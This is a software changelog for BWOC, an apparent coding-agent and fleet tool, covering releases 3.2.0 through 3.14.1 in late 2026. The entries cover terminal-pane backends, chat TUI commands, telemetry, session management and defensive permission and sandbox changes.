# Changelog

All notable changes to BWOC are documented in this file.

The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning 2.0.0](https://semver.org/). See [`VERSION.md`](VERSION.md) for the current version and phase status.

## [Unreleased]

## [v2026.10.8-1] — 2026-10-08 — 3.14.1

**`fleet term --backend herdr` opens the fleet.** A patch for 3.14.0, whose herdr backend was tested only against a fake server.

### Fixed

- **`bwoc fleet term --backend herdr` failed on every run.** herdr 0.9.3 rejects a `layout.apply` that names both `tab_id` and `workspace_id` (`invalid_target`), and 3.14.0 sent both. It now sends `tab_id` (replacing the shell tab herdr opens with a new workspace), or `workspace_id` when herdr returns no tab. A failed layout also left a workspace with the fleet's name holding one bare shell, so the next run said "Fleet already open" and attached to it; the half-built workspace is now closed on failure. If you ran 3.14.0's herdr backend, close any leftover workspace named `bwoc-fleet-…` in herdr.

## [v2026.10.8-0] — 2026-10-08 — 3.14.0

**See who is waiting on you.** Opt-in support for [herdr](https://herdr.dev), a background server that owns terminal panes and classifies the agent in each — inert unless you set the new keys. `bwoc doctor` also probes LiteLLM now.

### Added

- **`blocked` and `done` session states from herdr.** With `[integrations.herdr] enabled = true` in `.bwoc/workspace.toml` and a herdr server running, `bwoc sessions` (and the dashboard's agents pane) take each matched agent's state from herdr: `blocked` means the agent is waiting on you, `done` means it finished and you haven't looked. `--json` gains a `stateSource` field (`herdr`, `tmux`, `marker` or `null`). Agents are matched by marker pid first, then by a detected agent whose foreground cwd is inside `agents/<id>/`. Any herdr error or timeout (one ~300 ms budget per command, connect included) falls back silently to the activity heuristic. Unix only.
- **`bwoc fleet term --backend tmux|herdr`.** `herdr` opens the same per-agent panes (`bwoc spawn` in each) as one herdr workspace. The default comes from `[fleet] pane_backend` (else `tmux`). `bwoc send` wakes agents through herdr only when that key is `herdr`, and only into a pane labelled with the agent's id or one where herdr detects a running agent — never a plain shell in the agent's directory. `bwoc supervise` warns when the workspace selects herdr: herdr is then the parent of those agent processes, so they must not also be supervised. See [`FLEET-GOVERNANCE.en.md` §2](docs/en/FLEET-GOVERNANCE.en.md).

### Changed

- **`bwoc doctor` checks the LiteLLM endpoint too.** Its local-model check probed only Ollama's `localhost:11434`, so a host that runs its local model behind LiteLLM got a misleading "Ollama not reachable" warning. It now probes every endpoint the `ollama` and `litellm` backends would call, resolved the way the harness resolves them: Ollama's default, and `LITELLM_API_BASE` (or LiteLLM's default `localhost:4000`). It passes if any one of them answers and warns only if none do, naming each one it tried. The check is named `local model endpoint` (it was `ollama endpoint (localhost:11434)`).

## [v2026.10.4-0] — 2026-10-04 — 3.13.0

**Bring back what you sent.** In the chat TUI, `PgUp` / `PgDn` now step through the lines you already sent from that input, as in a shell, and a harness run that is killed still leaves its telemetry. Nothing in the compatibility contract changes. One habit does: `PgUp` / `PgDn` no longer scroll, so use `↑` / `↓`, the mouse wheel or `End`.

### Changed

- **`PgUp` / `PgDn` in the chat TUI recall lines you already sent.** They used to scroll the conversation 10 rows, which duplicated the arrow keys. They now step back and forward through the lines sent from that input, shell-style, in the single-agent view and in every fleet or side pane. The first `PgUp` sets the half-typed line aside, and `PgDn` past the newest entry brings it back. A repeated line is kept once, blank lines are not kept, and each input remembers the last 100. Scrolling stays on `↑`/`↓`, the mouse wheel and `End`.

### Fixed

- **A run that dies still leaves its telemetry.** A harness run killed before it finished (SIGKILL, OOM, a panic) wrote no `session-metrics.jsonl` line and exported no span, because both happened only in `finish()`. The harness now keeps a crash-safe copy of the session in `.bwoc/telemetry-inflight/`, rewritten each turn. The next run in that workdir records any session whose process is gone, with `harness.end_reason = "abandoned"` and one task attempted but not completed, and exports its span with status Error, ending at its last checkpoint. See [`HARNESS.en.md` §OpenTelemetry](docs/en/HARNESS.en.md). (team tianting t3)

## [v2026.9.26-0] — 2026-09-26 — 3.12.0

**Traces you can turn on from a released binary.** The harness has exported an OTLP trace since BWOC-2, but only builds made with `--features otel` could emit it, and no release was built that way. Release binaries now carry the exporter, span names follow the OpenTelemetry GenAI conventions, and `gen_ai.provider.name` reports the provider actually in use. Nothing is sent unless `OTEL_EXPORTER_OTLP_ENDPOINT` is set.

### Added

- **Release binaries can emit OpenTelemetry.** `release.yml` builds with `--features bwoc-harness/otel`. The exporter stays inert until `OTEL_EXPORTER_OTLP_ENDPOINT` is set: `export_otel_span` returns before building one, so an unconfigured binary opens no socket. See [`HARNESS.en.md` §OpenTelemetry](docs/en/HARNESS.en.md). (#584; council decision D1, team tianting)

### Changed

- **Span names follow the GenAI semantic conventions** (`{operation} {target}`): `bwoc.session` → `invoke_agent <agent>`, `bwoc.turn` → `chat <model>`, and tool spans → `execute_tool <tool>`. Traces now line up with those from other GenAI clients. **A dashboard or alert keyed on the old `bwoc.*` span names needs updating.** Span names are not one of the public surfaces in [`COMPATIBILITY.en.md`](docs/en/COMPATIBILITY.en.md).
- **`gen_ai.provider.name` reports the real provider.** It was hardcoded to `"openai"` on every path, native Anthropic and the vendor CLIs included. It now comes from the live client (`ProviderClient::provider_name()`).

### Fixed

- **A flaky test run.** Tests that wrote a script and exec'd it straight away could fail with `Text file busy` (ETXTBSY) when another test thread forked in between. All eight such tests now write their scripts from a child process (#583). This affected tests only.

## [v2026.9.25-1] — 2026-09-25 — 3.11.0

**Click a pane to talk to it.** A click on an agent pane's input box focuses it, and two review fixes that never reached `main` land: `/undo` no longer deletes a file it could not read, and the context pane follows re-edits and linked worktrees. Nothing that worked in 3.10 breaks; with panes open, select text with Shift-drag (Option-drag on macOS).

### Fixed

- **`/undo` no longer deletes a file it could not read.** The undo journal recorded any read failure — permissions, an I/O error, a directory — as "the file did not exist", so undoing that turn deleted whatever was there. Only a genuinely missing file counts as absent now; anything else is left out of the journal. A corrupt or hand-edited journal cursor is clamped instead of indexed, so it cannot panic the session. (Review fix from #542 that was pushed after the PR merged and never reached `main`.)
- **The context pane's `changed` list follows re-edits and stays bounded, and a linked worktree shows its branch.** A file edited twice kept its first position, and the list grew for as long as the session ran; it is now most-recent-first and capped at 50. A worktree whose `.git` file holds a relative `gitdir:` (what `git worktree add` writes) was resolved against the process's cwd, so the pane showed no branch; the pointer now resolves against the worktree. (Review fix from #546 that was pushed after the PR merged and never reached `main`.)

### Added

- **Click a pane's input box to focus it.** With agent panes open, a left click on a pane's input box moves focus there, as `Tab` does; clicks elsewhere change nothing. The TUI asks the terminal for mouse presses only while panes are open (press/release, no motion), so a single session keeps the terminal's own drag-to-select. With panes open, select text with Shift-drag (Option-drag in macOS Terminal/iTerm); the wheel still scrolls the focused pane.

## [v2026.9.25-0] — 2026-09-25 — 3.10.0

**The model you see is the model that answered.** A LiteLLM router that answers from a fallback model now says so in the chat instead of passing a smaller model's reply off as the one you chose. Nothing that worked in 3.9 breaks; frontends that do not know the new `model_fallback` event skip it.

### Added

- **The chat says when LiteLLM answered from another model.** When the model you asked for rejects a request — for example a `max_tokens` above its limit — LiteLLM retries on a fallback group and returns HTTP 200 as if nothing happened, so a 4B model could answer in place of the one on the status line. The harness now reads `x-litellm-attempted-fallbacks` and `x-litellm-model-group` and sends a new `model_fallback` chat event before the reply; the TUI shows `⚠ this reply is from <group>, not <model>`. The session keeps asking for the model you chose. Non-chat runs log the same warning to stderr.

## [v2026.9.24-2] — 2026-09-24 — 3.9.1

**Agents opened with `/agents` answer as themselves.** A patch for 3.8–3.9 panes, which ran in the workspace root instead of the agent's directory.

### Fixed

- **An agent opened with `/agents` answers as itself.** The pane ran the harness in the workspace root instead of the agent's directory, so it got the generic project prompt instead of the agent's `AGENTS.md`, persona and memory, and shared one session file (and so one history) with the main session and every other pane. A `claude`-backend agent was worse: the `claude` CLI ran wherever `bwoc` was started and took its identity from the `CLAUDE.md` and hooks it found there — agent-inao said it was agent-fern. Panes now run in the agent's directory, as `bwoc chat <agent>` does, and the `cli` provider runs each turn in the session's workdir.

## [v2026.9.24-1] — 2026-09-24 — 3.9.0

**Every agent in the workspace, one window.** `/agents` now opens `claude`-backend agents too — through the harness's chat-only `cli` provider on the CLI's own login, no API key — so a workspace of Claude agents can be talked to from panes beside your session. Nothing that worked in 3.8 breaks.

### Added

- **`/agents` opens `claude`-backend agents too.** They were refused with "open it with `bwoc chat`". They now open in a pane through the harness's chat-only `cli` provider (`claude -p`, the CLI's own login, no API key) with the agent's `primaryModel`; the pane says plainly that the CLI runs its own tools under its own permissions, outside the harness sandbox. Other vendor CLIs have no print mode the harness speaks and still point to `bwoc chat`.

## [v2026.9.24-0] — 2026-09-24 — 3.8.0

**Your agents, in the same window.** `/agents` opens a workspace agent in its own pane and you talk to it there, with six layouts to arrange them; `/settings` now changes the runtime and applies it without leaving the session; a bare `bwoc` session works by the BWOC principles; and assistant Markdown renders as CommonMark — tables, links, nesting — without eating `snake_case`. Nothing that worked in 3.7 breaks.

### Fixed
- **Assistant Markdown renders correctly in the chat TUI.** The hand-written line scanner took every `_` and `*` as emphasis — `snake_case` showed as `snakecase`, `2 * 3 * 4` as `2  3  4` — and left links, tables, `1)` lists, task boxes, escapes, rules, `~~~` fences and nested emphasis raw. `bwoc-tui` now parses CommonMark with GitHub tables, task lists and strikethrough (`pulldown-cmark`, no default features): tables line up in columns, links show their text then the URL, nested lists indent, and line breaks stay as written.
### Changed
- **A bare `bwoc` session works by the BWOC philosophy.** An agent session reads its `AGENTS.md`, which is grounded in the 22 frameworks, but a project session got a generic coding preamble that never named one. The built-in preamble now states each working rule with the principle it applies — Ariyasacca, Yoniso manasikāra, Mattaññutā, Paṭiccasamuppāda, Anattā, Attaññutā, the Sīla care rules and Kalyāṇamitta — at about the same length (53 lines).
### Added
- **Pane layouts.** With agent panes open, `Ctrl-L` cycles and `/layout <name>` (with a picker) sets how panes are arranged: `main-vertical` (default), `main-horizontal`, `columns`, `rows`, `grid`, `single` — the names `bwoc fleet term --layout` uses. The footer names the current layout.
- **`/settings` changes the runtime, not just shows it.** `/settings` opens a key picker (with each current value); `/settings <key> <value>` saves `model`, `backend`, `endpoint`, `max_tokens` or `max_context` under `[runtime]` in the project's `.bwoc/config.toml` (comments and other keys kept), re-resolves with the usual precedence (a flag or env var still wins, and the message says so), and restarts the harness on the same conversation. A value that leaves no runnable runtime is rolled back; a vendor-CLI backend is refused.
- **`/agents` — talk to a workspace agent in its own pane.** A bare `bwoc` session lists the agents of the workspace it sits in and opens a picker; the chosen agent opens beside the main session, driven by its own harness with its manifest's backend, model and endpoint. `Tab` / `Shift-Tab` move focus, each pane keeps its own transcript, input and permission prompts, `/quit` in an agent pane closes just that pane, and agent panes survive a `/session` switch of the main pane.

## [v2026.9.23-0] — 2026-09-23 — 3.7.0

**Pick from a list, plan before acting.** `/mode` and `/model` open pickers — the model list comes from the backend itself, now including LiteLLM, OpenRouter and OpenAI-compatible servers — `plan` mode lets the agent look and propose without changing anything, and a session on vLLM or LiteLLM learns the model's real context window instead of compacting at 8k. Nothing that worked in 3.6 breaks.

### Added

- **`/mode plan` in the chat TUI.** The harness has had a read-only planning mode; the TUI now accepts it by name and lists it in the `/mode` picker. `F2` still cycles `default` → `accept_edits` → `bypass`, so plan mode is never entered by accident.
- **`/model` opens a picker.** A bare `/model` lists what `/models` would, filtered as you type (any part of the id, so `gpt` finds `openai/gpt-…`), with the current model marked; `Enter` switches. A backend that cannot list says why and `/model <name>` still works.
- **`/mode` opens a picker.** A bare `/mode` lists `default`, `accept_edits` and `bypass` in the input popup with what each allows and the current one marked; `↑`/`↓` and `Enter` set it, `Esc` keeps it. `/mode <name>` and `F2` work as before.

### Fixed

- **The `/` popup keeps the highlighted row in view.** It showed the first 8 rows only, so arrowing past `/fork` highlighted a row off screen; the list now scrolls with the selection.
- **A tool call left as text now names the likely cause.** The warning (#403) blamed a weak model; the usual cause is a server tool-call parser that does not match the model's format (vLLM `--tool-call-parser hermes` on Qwen3, which emits XML), so it now says that first.
- **Chat sessions learn the context window from vLLM and LiteLLM.** Only Ollama's `/api/show` was asked, so any other OpenAI-compatible server fell back to an 8k-token budget and compacted far too early (a 64k vLLM model: 8k). The harness now also reads vLLM's `max_model_len` on `GET /models` and LiteLLM's `model_info.max_input_tokens` on `GET /model/info` (set it in the proxy config), with the session's key.
- **`/models` lists models on `litellm`, `openrouter`, `openai-compatible` and `anthropic`** (#551). It refused every backend but Ollama; it now asks the harness (`bwoc-harness --list-models`), which calls `GET /models` with the same endpoint and key the chat resolves, so a scoped LiteLLM virtual key lists exactly the models it may call. A refused listing says why (`HTTP 401 …`, no key, unreachable) instead of showing an empty list.

## [v2026.9.21-1] — 2026-09-20 — 3.6.0

> Both 3.5.0 and 3.6.0 were released on 2026-09-20. The `v2026.9.21-*` tags are dated a day ahead: 3.5.0's tag was typed from memory, and a later tag must keep sorting upward, so 3.6.0 stayed on that date. `scripts/next-tag.sh` now derives the tag, and `release.yml` refuses one that is more than a day from the cut.

**A session that can answer for itself.** The chat input gains thirteen commands — what this session is, what it may do, what it costs, what it is connected to — and a fixed context pane shows where you are while you work. Nothing that worked in 3.5 breaks.

### Added

- **Nine more `/` commands in the chat TUI.** `/status`, `/tools`, `/cost`, `/retry` and `/save [path]` report what the TUI already knows (the tool list the harness sends on `Ready` was being dropped); `/models`, `/backends`, `/settings` (alias `/config`) and `/doctor` answer through a new `EnvironmentInfo` trait the caller implements, so `bwoc-tui` still compile-depends on `bwoc-core` alone. `/models` enumerates only where a backend really can (Ollama), `/backends` names each key's source but never a key, and `/doctor` runs `bwoc doctor --json` rather than a second copy of the checks.

- **A fixed context pane in the chat TUI.** On a terminal at least 100 columns wide, the right 34 columns show where the session is and what it has done: the directory and its git branch (read from `.git/HEAD`, no `git` process), the workspace above it and that workspace's agents (from `.bwoc/workspace.toml` / `agents.toml`), the conversation id, turns, usage and mode, and the files tools have changed this session. `F3` hides or shows it; a narrower terminal keeps the whole width for the conversation. Disk facts are re-read at turn boundaries, never per frame.
- **`/compact`, `/permissions`, `/mcp` and `/context` in the chat TUI.** Two protocol additions carry them: `Compact` runs the same context engine the budget triggers and answers with the existing `Compacted` event (`removed = 0` when nothing folded), and `Describe { topic }` answers with `Described { topic, rows }` — one input and one event for every read-only question, so a new topic is a new string rather than a new variant. `/permissions` shows session mode, policy default, per-tool modes and pattern rules; `/mcp` groups the registry's `mcp__<server>__<tool>` entries by server; `/context` reports the system prompt size, messages in context, compaction budget, model and fallbacks. No secret is reachable through any of them.

## [v2026.9.21-0] — 2026-09-20 — 3.5.0

**The chat session grows a spine.** Stop a turn with `Esc`, switch models mid-session, see a diff of every file a tool changed, move between this directory's conversations without leaving the TUI, read answers as rendered Markdown, and take a turn's file changes back with `/undo`. Nothing that worked in 3.4 breaks.

### Added

- **Cancel a running turn, switch models live, see file diffs and provider cost (runtime R4c).** The chat protocol gains `Cancel` and `SetModel` inputs and `Cancelled`, `ModelChanged` and `Diff` events; `TurnEnd` gains an optional `cost_usd`.
  - **`Esc` cancels the turn in flight.** The harness watches stdin while the provider streams (dropping the partial answer) and at each tool-call boundary, so a cancel mid-tool still lands once that call has its result and the conversation stays well-formed. Input that arrives while a turn runs is queued, never dropped.
  - **`/model` / `/model <name>`** shows or switches the model later turns use. The operator's choice replaces the entry in use, leaving the fallback chain intact.
  - **A file-mutating tool (`write_file`, `edit_file`, `multi_edit`) emits a unified diff** of the file it changed, capped at 8 KB and marked when truncated; a rewrite larger than 1,000 lines is summarized instead of aligned. Display-only, dependency-free, and confined to paths inside the working directory.
  - **Session cost** is reported only when the provider reports one (`usage.cost`, e.g. OpenRouter). The status line shows nothing otherwise — no price is estimated locally.

- **Switch conversations and read Markdown without leaving the chat TUI (runtime R5).** `/sessions` lists this directory's conversations (the open one marked), `/session <id>` opens another, `/new` starts one, `/fork [<id>]` copies one and opens the copy. The TUI reopens the harness on the chosen conversation in the same terminal, so the alt screen is entered once. An assistant turn now renders as Markdown — headings, bullets, quotes, fenced and inline code, bold and italic — while tool results, diffs and notices stay verbatim. Session management arrives through a `SessionControl` trait the caller implements, so `bwoc-tui` still compile-depends on `bwoc-core` alone.
- **`/undo` and `/redo` for a turn's file changes (runtime R4b).** The session keeps an edit journal beside the conversation (`<session-file>.undo/`): every `write_file` / `edit_file` / `multi_edit` in a turn is recorded with the text before and after, and `/undo` puts the newest such turn back, `/redo` reapplies it. A file whose content on disk is neither side of the step — changed by `run_command` or by you — is reported and **left alone**, never overwritten; a binary or over-1 MB write is reported as not journalled. Recording a new turn drops the redo future. Protocol: `Undo` / `Redo` inputs and a `Reverted` event.

## [v2026.9.20-0] — 2026-09-20 — 3.4.0

**A chat input that works like the rest of your tools.** `/` opens a command menu in the chat TUI and `@` completes project files and attaches them to your message. `bwoc dashboard` is deprecated in favour of `bwoc fleet`. Nothing that worked in 3.3 breaks.

### Added

- **`/` commands and `@` file mentions in the chat TUI.** In the input line, `/` opens a command menu (`/help`, `/clear`, `/mode [default|accept_edits|bypass]`, `/quit`, `/exit`) and `@` completes project files; `↑`/`↓` pick, `Tab` completes, `Esc` hides. Commands run in the TUI and never reach the model. On send, each `@path` naming a text file inside the working directory attaches its content (up to 32 KB per file); paths outside the directory and binary files are reported, not attached. No protocol change.

### Deprecated

- **`bwoc dashboard`** — use `bwoc fleet` for the status overview, or `bwoc chat <agent> --tui --fleet` for every agent's live session in one TUI without tmux. It still runs its own TUI and prints one stderr line (`BWOC_NO_DEPRECATION_WARNINGS=1` silences it). Removed in 4.0; see [`COMPATIBILITY.en.md` §Deprecated in 3.4](docs/en/COMPATIBILITY.en.md#deprecated-in-34-removed-in-40).

### Fixed

- **`bwoc session fork` says which conversation bare `bwoc` resumes.** The fork is the newest write, so bare `bwoc` continues it; the message used to suggest opening the fork with `--session`, implying the original stayed the default. It now names the fork as the resumed one and shows how to open the original. Behavior is unchanged.

## [v2026.9.19-0] — 2026-09-19 — 3.3.0

**Several conversations per directory.** Bare `bwoc` still resumes where you left off, and now `bwoc --new` starts another conversation, `bwoc --session <id>` resumes a specific one, and `bwoc session list`, `bwoc session fork` and `bwoc session rm` manage them (runtime R4a). Bare `bwoc --backend claude` (or `codex`, `agy`, `kimi`, `grok`, `copilot`) opens that vendor CLI on its own subscription, and the chat TUI gets explicit, copy-friendly controls. 3.2 conversations move to the new layout on first open. Nothing that worked in 3.2 breaks.

### Added

- **Several conversations per directory (runtime R4).** Bare `bwoc` still resumes the directory's latest conversation; `bwoc --new` starts another and `bwoc --session <id>` (id or unique prefix) resumes a specific one. `bwoc session list [--all] [--json]` lists them with title, message count and last write, `bwoc session fork [<id>]` copies one into a new session that records its parent, and `bwoc session rm <id>` deletes one. Conversations live in `~/.bwoc/sessions/<dir-hash>/<id>.json`; a 3.2 `~/.bwoc/sessions/<dir-hash>.json` moves in the first time its directory is opened, so an upgrade resumes the same conversation. (`bwoc sessions` still lists running agent processes.)

### Changed

- **Chat TUI controls are explicit and copy-friendly.** `Ctrl-C` is the only exit key, so `q` is always ordinary input and `Esc` no longer closes the session. The chat pane scrolls one row with `↑` / `↓`, retains page navigation with `PgUp` / `PgDn` and `End`, and `←` / `→` move a Unicode-safe input cursor for editing. A persistent footer shows the controls. Idle frames stop repainting so native terminal text selection remains stable for copying.

### Fixed

- **Bare `bwoc` works on a Claude Code / Codex / Antigravity / Kimi / Grok subscription (#529).** `bwoc --backend claude` (or `codex`, `agy`, `kimi`, `grok`, `copilot`) used to exit 2 with "can't run a bwoc session". It now execs that vendor CLI in the current directory, forwarding `--model` when set, after a one-line notice that the CLI's own login, tools and permissions apply and bwoc-harness tools and trust gates do not. A config file's `[defaults] backend` now stands in for an absent `[runtime] backend`, so a declared fleet backend reaches the session. When nothing is configured, the setup help names the vendor CLIs found on `PATH`; none is picked automatically.

## [v2026.9.15-0] — 2026-09-15 — 3.2.0

**BWOC as its own coding agent.** Run `bwoc` in any repository and, on a terminal, it opens a coding session over the current directory — no workspace, agent or manifest needed. The provider resolves from flags, env, a project or user `config.toml`, or auto-detect (an Anthropic key or a local Ollama), and `bwoc auth` stores API keys `0600`. Chat sessions now run the batch paths — retry and fallback, MCP, the capability gate and OS sandbox, a context budget sized to the model — and gain coding tools: `glob`, regex `grep`, `multi_edit`, `webfetch`, `todo`, `subagent` and a `run_command` timeout. A lean pass removes dead code, stub plugins and unused skills; the Kalyāṇamitta trust gate runs by default in warn mode; duplicate CLI entry points are deprecated (removed in 4.0). Nothing that worked in 3.1 breaks.

### Removed

- **Dead code with no production caller** — the empty `bwoc-core` `identity` / `error` stubs and the unused `lifecycle` module; `TrustBlock::missing_in`; `git_worktree::{worktree_add, worktree_path, worktree_branch}`; `bwoc-agent` `i18n::t`; `ToolQueue::in_flight_count`; the never-read `Caps::max_leases` and `FleetSnapshot.workspace` fields. The Rust API is not a public surface ([`COMPATIBILITY.en.md`](docs/en/COMPATIBILITY.en.md)); CLI behaviour is unchanged.
- **`bwoc-harness` `browser` feature** — the headless-Chromium `computer` executor (`tools/browser.rs`, optional `chromiumoxide` dependency). Nothing enabled it: no CI job, script or Formula built with `--features browser`. The `computer` tool model and Anthropic tool spec remain.
- **Three stub plugins with no runtime.** `modules/plugins/memory-tier2-noop/` and `modules/plugins/llm-backend/{hermes,openclaw}/` named entry binaries (`bwoc-plugin-memory-tier2-noop`, `bwoc-llm-hermes`, `bwoc-llm-openclaw`) that nothing builds and no code path loads. The `memory-backend` and `llm-backend` kinds stay in the spec, but no plugin of either kind ships. Tier 2 memory keeps working through the agent's `deepMemoryCmd` (`bwoc-core::deep_memory`). The framework now ships 25 plugins across 7 kinds.
- **18 unused framework skills.** `modules/skills/` now ships the 5 the fleet uses: `documenter`, `auditor`, `engineering`, `ai-dlc`, `second-brain`. The removed skills were prose-only, and no code loaded them. Removed: `ai-loop-engineer`, `counselor`, `data-engineer`, `data-scientist`, `gcloud-ops`, `illustrator`, `lawyer`, `manager`, `mathematics`, `physics`, `product-manager`, `scrum-via-jira`, `server-rag`, `software-engineer`, `soul`, `systems-engineer`, `worktree-discipline`, `writer`. The skill-on-plugin mechanism (`requires_plugins`) is unchanged.
- **Template shell scripts** — `modules/agent-template/scripts/incarnate.sh` and `check-agent-neutrality.sh` are gone; `bwoc new` and `bwoc check` replaced them long ago. Every live doc, the `/incarnate` and `/check-neutrality` skills, and root `CLAUDE.md` now point at the CLI.

### Fixed

- **TUI answers hidden below the chat box.** The transcript window counted lines, not screen rows, so a long tool result or permission prompt that wrapped pushed the newest rows (often the model's answer) out of view. Lines are now wrapped to the pane width before the window is taken.
- **TUI permission prompts no longer eat typing.** `a`/`d` answer a pending prompt only on an empty input line and once the prompt has been up for 500 ms, so a prompt that appears while you type can't approve (or deny) a tool call from a letter in your sentence. Chat and fleet panes both.
- **TUI:** a harness warning on stderr (e.g. the cgroup `RLIMIT_NPROC` fallback) no longer paints over the chat screen; on a terminal the harness's stderr goes to `~/.bwoc/logs/tui-harness.log`, and a redirected stderr is still inherited.
- **Skill gates that could never pass.** Every shipped skill's `[gates].verify` called `bwoc skill verify <self>`, which the recursion guard refuses. The kept skills and `modules/skill-template/` now declare no gate, since `[gates]` is optional. `bwoc check` reports any `[gates].verify` that invokes `bwoc skill verify` as a violation.
- **`bwoc doctor` reads a long Ollama model list.** The `/api/tags` probe sent HTTP/1.1, and Ollama answers a long model list with a chunked body, which the probe could not parse, so doctor reported installed models as missing. It now sends HTTP/1.0, whose response is never chunked. Bare `bwoc` uses the same probe to find a local Ollama.
- **`bwoc check` accepts the bearer `[auth]` shape for workflow plugins.** The workflow `auth.toml` audit used to require gcloud's `[sources]` table (adc / service_account / env), so the shipped `workflow/accounting-api` plugin always failed `bwoc check --all`. The audit now also accepts `[auth]` with `scheme = "bearer"`, `env_var` set to an env-var NAME, and `key_file` set to a relative path under `.bwoc/secrets/` (absolute paths and `..` are rejected). `[auth]` gets the same fail-closed undeclared-key guard as `[sources]`, and values are never echoed. An `auth.toml` with neither table is still a violation.
- **Dangling doc references** — links to `trust-model.md`, `interconnect/coordination.md`, `memories/memory.md`, and the never-shipped template companions (`FAILURE-MODES`, `LIFECYCLE`, `OBSERVABILITY`, `COORDINATION-PROTOCOL`, `ANTIPATTERNS`, template `GLOSSARY`) are repointed to files that exist or removed.
- **`bwoc chat <agent>` without `--tui` works for harness backends.** It launched `bwoc-harness` with neither `--chat` nor `--task`, so ollama / openai-compatible / openrouter / litellm agents exited with "--task is required". On a terminal it now opens the chat TUI, with a one-line note, because raw `--chat` speaks JSON lines rather than a human REPL. With piped stdin or stdout it runs `bwoc-harness --chat --workdir <agent>`, the `chat_proto` endpoint, which `bwoc spawn`'s no-TTY guard now lets through. `--team` is honoured on both routes.
- **`bwoc chat --tmux` / `--ghostty` work for harness backends.** The new pane or window relaunches `bwoc chat <id>` (carrying `--workspace`, `--lang`, `--tui`, `--team`) and so lands in the chat TUI, instead of re-running `bwoc spawn`, which failed with "--task is required". Vendor backends are unchanged.
- **`bwoc chat` accepts `grok` agents.** `bwoc chat` and `bwoc run` now share one backend parser derived from the backend enum, so every backend `bwoc new` accepts is recognised by both.
- **`bwoc auth set` restores terminal echo on Ctrl-C.** Interrupting the hidden key prompt left the terminal with echo off. A SIGINT handler now restores it and exits 130.
- **The chat TUI keeps line breaks.** Multi-line assistant text and tool output used to run together on one line.

### Changed

- **Docs stop promising what the code doesn't do.** `fallbackModel` is documented as metadata only (the harness fallback chain comes from `autoModels`); `sessionsPath` is marked reserved/unused; the manifest schema in `AGENTS.md` §8.2, SRS §5.3 and `conventions.md` uses the real keys (`primaryModel`, flat `memoryPath`); unenforced `maxConcurrentTasks` / `worktreeIsolation` / `memory.wakeUpOnStart` / `maxMemoryIndexLines` defaults are dropped from the template manifest. HARNESS no longer claims `context_limit` or persona come from the manifest. `interconnect/capabilities.md` is no longer called machine-readable, the `persona/` / `mindsets/` / `skills/` slots and `task-log.jsonl` are described as reference material / agent conventions, and the SKILLS / PLUGINS lifecycle and spawn- or startup-time resolution are labelled "specified, not enforced by the runtime". The SRS gains a per-FR-group implementation status table. INCARNATION (EN/TH) describes `bwoc new` as shipped, and ROADMAP's `task-claimed` hook no longer claims to run `git worktree add`.
- **Kalyāṇamitta trust gate on by default, warn-only** — with `BWOC_TRUST_GATING` unset the daemon used to skip the quality gate entirely, and no fleet host set it, so `requiredTrust` was never evaluated at runtime. Unset now means the gate runs in **warn** mode: a sender missing a required quality is still delivered and a `trust_warn` line is logged, once per `(sender, missing)` per daemon run. Nothing newly refuses: a manifest `trust.mode` of `refuse` (or absent with non-empty `requiredTrust`) is capped at warn unless `BWOC_TRUST_GATING=1`, which keeps its exact prior semantics; `0`/`off`/`false` disables the gate; manifest `mode: "off"` is honoured; with `BWOC_SIGNING_MODE=off` the default does not engage. Signature verification, replay defense and `inbox.refusals.jsonl` are unchanged. See [`trust.md` §Daemon gating](modules/agent-template/interconnect/trust.md#daemon-gating-bwoc_trust_gating).
- **`bwoc-harness --chat` / `--headless` follow the batch paths.** Provider calls use the batch retry layer, which also keeps Anthropic thinking blocks for replay; repeated malformed tool calls move to the next `autoModels` fallback; `--mcp` / `--mcp-http` servers register. Tool calls pass the capability gate and run through the turn executor and OS sandbox instead of in-process. On an untrusted turn, a `--headless` session denies gated tools (`run_command`, git, network) as batch does, and an interactive session requires an explicit Allow that bypass or accept-edits mode cannot give. The compaction budget comes from the model's context window instead of a fixed 8,000 tokens.

### Deprecated

- **Duplicate CLI entry points** — each still works exactly as before (same handler; byte-identical stdout, `--json` and exit code) and prints one line to stderr naming its replacement. `BWOC_NO_DEPRECATION_WARNINGS=1` silences it. Removed in 4.0; see [`COMPATIBILITY.en.md` §Deprecated in 3.2](docs/en/COMPATIBILITY.en.md#deprecated-in-32-removed-in-40).
  - `bwoc notes | retro | research <new|list|view>` → `bwoc doc <new|list|view> notes | retrospectives | research`
  - `bwoc tasks` → `bwoc task list --all` — `task list` gains `--all`, `--agent` and `--state`, and `<TEAM>` becomes optional with `--all`
  - `bwoc memory t2-search <query> <agent>` → `bwoc memory search <query> <agent> --tier 2` — `memory search` gains `--tier 1|2` (default 1)

### Added

- **Bare `bwoc` opens a coding session in the current directory.** On a terminal (stdin and stdout both TTYs), `bwoc` with no subcommand starts the chat TUI on `bwoc-harness --chat` in the cwd. No workspace, agent or manifest is needed. Off a terminal it prints the banner byte-for-byte as before, and the new `bwoc about` prints the banner on a terminal. The runtime resolves from `--backend` / `--model` / `--endpoint`, then `BWOC_BACKEND` / `BWOC_MODEL` / `BWOC_ENDPOINT`, then a project `.bwoc/config.toml` (cwd up to the git root), then `~/.bwoc/config.toml` (`[runtime]` table, `schema_version`, a newer revision is refused), then auto-detect (Anthropic key, then a local Ollama). With none of those it prints setup help and exits `2`. The conversation persists under `~/.bwoc/sessions/`. See [`HARNESS.en.md` §Quick start](docs/en/HARNESS.en.md#quick-start-bwoc-in-any-repository).
- **`bwoc auth set <provider>` and `bwoc auth status`** for `anthropic`, `openrouter`, `litellm` and `openai-compatible`. `set` reads the key from stdin (hidden on a terminal) or `--from-env VAR`, writes `[<provider>] api_key` to `~/.bwoc/secrets.toml` (created `0600`, other sections kept) and refuses a group/world-readable file. `status` shows provider names and key sources only. The harness now sends a stored `[openai-compatible] api_key` as a bearer token.
- **System prompt for sessions.** A project session (no `config.manifest.json` in the workdir) gets a built-in coding-agent preamble, an environment block (cwd, OS/arch, UTC date, git branch and dirty state) and every `AGENTS.md` / `CLAUDE.md` from the git root down to the cwd, nearest last, capped at 32 KB. An agent session keeps its `AGENTS.md` and `MEMORY.md` index and also gets a condensed persona and mindsets block (8 KB cap). A bwoc-connect public workdir never reads above itself. `bwoc-harness` gains `--max-tokens` (overrides the manifest's `maxTokens` in `--chat` / `--headless`).
